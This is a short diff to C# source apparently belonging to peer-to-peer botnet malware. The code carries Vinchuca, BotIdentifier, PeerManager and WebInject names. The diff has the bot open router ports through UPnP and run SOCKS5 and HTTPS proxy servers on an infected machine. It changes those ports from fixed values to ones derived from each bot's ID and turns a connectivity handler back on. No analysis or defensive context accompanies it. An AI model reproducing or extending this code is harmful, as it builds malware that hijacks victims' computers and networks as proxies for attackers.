@@ -2,7 +2,6 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net;
-using System.Net.Sockets;
 using Vinchuca.Actions.Socks5;
 using Vinchuca.Actions.WebInject;
 using Vinchuca.Network;
@@ -68,9 +67,11 @@ namespace Vinchuca
                     Logger.Verbose("External IP Address: {0}", PublicIP);
                     try
                     {
-                        e.Device.CreatePortMap(new Mapping(Protocol.Udp, port, BotIdentifier.Id.GetPort()));
-                        e.Device.CreatePortMap(new Mapping(Protocol.Tcp, port, 8009));
-                        e.Device.CreatePortMap(new Mapping(Protocol.Tcp, port, 8019));
+                        var externalPort = BotIdentifier.Id.GetPort();
+                        var device = e.Device;
+                        device.CreatePortMap(new Mapping(Protocol.Udp, port, externalPort));
+                        device.CreatePortMap(new Mapping(Protocol.Tcp, port, externalPort + 1));
+                        device.CreatePortMap(new Mapping(Protocol.Tcp, port, externalPort + 2));
                     }
                     catch (MappingException ex)
                     {
@@ -93,10 +94,11 @@ namespace Vinchuca
 
             RegisterMessageHandlers(peersManager);
 
-            _socks5 = new Socks5Server(8009);
-            _https = new HttpsProxyServer(8019);
+            var externPort = BotIdentifier.Id.GetPort();
+            _socks5 = new Socks5Server(externPort+1);
+            _https = new HttpsProxyServer(externPort+2);
             _connectivityTester = new ConnectivityTester();
-//            _connectivityTester.OnConnectivityStatusChanged += OnConnectivityStatusChanged;
+            _connectivityTester.OnConnectivityStatusChanged += OnConnectivityStatusChanged;
         }
 
         private void RegisterMessageHandlers(PeerManager peersManager)
